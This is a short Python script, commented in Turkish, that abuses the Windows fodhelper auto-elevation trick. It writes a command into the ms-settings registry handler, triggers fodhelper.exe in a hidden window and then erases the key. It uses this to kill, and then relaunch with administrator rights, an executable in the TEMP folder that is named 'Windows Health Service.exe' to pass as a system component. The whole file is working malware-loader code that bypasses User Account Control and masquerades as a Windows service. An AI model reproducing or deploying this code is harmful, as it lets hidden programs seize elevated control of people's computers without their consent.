import os
import winreg
import subprocess
import time
import sys

# Ayar: Görev yöneticisindeki tam isim
target_process_name = "Windows Health Service.exe"

def run_hidden_command(cmd_string):
    """Komutları tamamen penceresiz çalıştırır."""
    try:
        subprocess.run(
            cmd_string,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def uac_bypass_action(command_or_path):
    """Verilen komutu UAC bypass (fodhelper) üzerinden sessizce yürütür."""
    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    try:
        # Kayıt defteri ayarı
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command_or_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # Tetikleyici (fodhelper) penceresiz çalıştır
        run_hidden_command("fodhelper.exe")
        
        # İşlem için bekle ve temizle
        time.sleep(4)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
    except:
        pass

if __name__ == "__main__":
    # 1. ESKİSİNİ KAPAT (UAC Bypass ile yönetici yetkili kapatma)
    # Taskkill'i cmd içinden 'start /b' ile çağırarak pencere açılmasını engelliyoruz
    kill_cmd = f'cmd /c start /b taskkill /F /IM "{target_process_name}" /T'
    uac_bypass_action(kill_cmd)

    # 2. YENİSİNİ AÇ (UAC Bypass ile yönetici yetkili başlatma)
    temp_folder = os.environ.get('TEMP')
    full_path = os.path.join(temp_folder, target_process_name)

    if os.path.exists(full_path):
        # Yolu tırnak içine alarak gönder
        uac_bypass_action(f'"{full_path}"')

    sys.exit()
